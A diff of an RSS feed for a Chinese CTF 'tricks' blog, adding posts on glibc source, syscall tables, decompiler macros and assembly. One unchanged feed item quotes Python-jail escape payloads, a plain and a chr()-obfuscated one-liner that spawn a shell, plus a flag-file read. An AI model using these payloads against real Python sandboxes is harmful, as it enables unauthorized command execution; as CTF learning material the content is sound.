@@ -8,7 +8,34 @@
     <language>zh</language>
     <copyright>&amp;copy; 2023 &lt;a href=&#34;https://github.com/PeterLiu-all&#34;&gt;Peter Liu&lt;/a&gt;
 </copyright>
-    <lastBuildDate>Mon, 02 Jan 2023 20:07:34 +0800</lastBuildDate><atom:link href="https://peterliuzhi.top/tricks/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Tue, 03 Jan 2023 03:07:58 +0800</lastBuildDate><atom:link href="https://peterliuzhi.top/tricks/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>glibc source code源码</title>
+      <link>https://peterliuzhi.top/tricks/glibc-source-code%E6%BA%90%E7%A0%81/</link>
+      <pubDate>Tue, 03 Jan 2023 03:07:58 +0800</pubDate>
+      
+      <guid>https://peterliuzhi.top/tricks/glibc-source-code%E6%BA%90%E7%A0%81/</guid>
+      <description>True happiness means forging a strong spirit that is undefeated, no matter how trying our circumstances. — Daisaku Ikeda Glibc source code (glibc-2.36.9000) - Bootlin，在线查看源码 Index of /gnu/glibc，直接从官网下载源码 GitHub - bminor/glibc: Unofficial mirror of sourceware glibc repository. Updated daily</description>
+    </item>
+    
+    <item>
+      <title>各平台syscall序号</title>
+      <link>https://peterliuzhi.top/tricks/%E5%90%84%E5%B9%B3%E5%8F%B0syscall%E5%BA%8F%E5%8F%B7/</link>
+      <pubDate>Tue, 03 Jan 2023 02:48:21 +0800</pubDate>
+      
+      <guid>https://peterliuzhi.top/tricks/%E5%90%84%E5%B9%B3%E5%8F%B0syscall%E5%BA%8F%E5%8F%B7/</guid>
+      <description>Love is the attempt to form a friendship inspired by beauty. — Cicero Linux System Calls quick and easy，美化很不错 可搜索的syscall表，但目前只支持x86_64 Chromium OS Docs - Linux System Call Table，和Linux大致一</description>
+    </item>
+    
+    <item>
+      <title>常见的宏定义</title>
+      <link>https://peterliuzhi.top/tricks/%E5%B8%B8%E8%A7%81%E7%9A%84%E5%AE%8F%E5%AE%9A%E4%B9%89/</link>
+      <pubDate>Tue, 03 Jan 2023 02:04:47 +0800</pubDate>
+      
+      <guid>https://peterliuzhi.top/tricks/%E5%B8%B8%E8%A7%81%E7%9A%84%E5%AE%8F%E5%AE%9A%E4%B9%89/</guid>
+      <description>The aim of life is self-development. To realize one&amp;rsquo;s nature perfectly - that is what each of us is here for. — Oscar Wilde /* This file [contains](https://so.csdn.net/so/search?q=contains&amp;amp;spm=1001.2101.3001.7020) definitions used by the Hex-Rays decompiler output. It has type definitions and convenience macros to make the output more readable. Copyright © 2007-2011 Hex-Rays */ #if defined(**GNUC**) typedef long long ll; typedef unsigned long long ull; #define __int64 long long #define __int32 int #define __int16 short #define</description>
+    </item>
+    
     <item>
       <title>调试arm程序</title>
       <link>https://peterliuzhi.top/tricks/%E8%B0%83%E8%AF%95arm%E7%A8%8B%E5%BA%8F/</link>
@@ -70,6 +97,15 @@
       
       <guid>https://peterliuzhi.top/tricks/%E7%BB%95%E8%BF%87pyjail%E4%B8%80%E5%8F%A5%E8%AF%9Drce/</guid>
       <description>Happiness cannot be travelled to, owned, earned, worn or consumed. Happiness is the spiritual experience of living every minute with love, grace and gratitude. — Denis Waitley 基础版 __import__(&amp;#39;os&amp;#39;).system(&amp;#39;sh&amp;#39;) 进阶版 getattr(getattr(getattr(getattr(().__class__,chr(95)+chr(95)+chr(98)+chr(97)+chr(115)+chr(101)+chr(95)+chr(95)),chr(95)+chr(95)+chr(115)+chr(117)+chr(98)+chr(99)+chr(108)+chr(97)+chr(115)+chr(115)+chr(101)+chr(115)+chr(95)+chr(95))()[-4],chr(95)+chr(95)+chr(105)+chr(110)+chr(105)+chr(116)+chr(95)+chr(95)),chr(95)+chr(95)+chr(103)+chr(108)+chr(111)+chr(98)+chr(97)+chr(108)+chr(115)+chr(95)+chr(95))[chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)](chr(115)+chr(104)) 如果知道flag文件的名字，可以用: open(chr(102)+chr(108)+chr(97)+chr(103)).read() 更多资料参见https://zhuanla</description>
+    </item>
+    
+    <item>
+      <title>汇编版hello world</title>
+      <link>https://peterliuzhi.top/tricks/%E6%B1%87%E7%BC%96%E7%89%88hello-world/</link>
+      <pubDate>Wed, 26 Oct 2022 19:05:28 +0800</pubDate>
+      
+      <guid>https://peterliuzhi.top/tricks/%E6%B1%87%E7%BC%96%E7%89%88hello-world/</guid>
+      <description>Prejudice is a burden that confuses the past, threatens the future and renders the present inaccessible. — Maya Angelou 一个非常简易的向用户读取输入姓名，将其显示在屏幕上，同时用hello world向其问候的程序在C语言中极其简便，</description>
     </item>
     
   </channel>
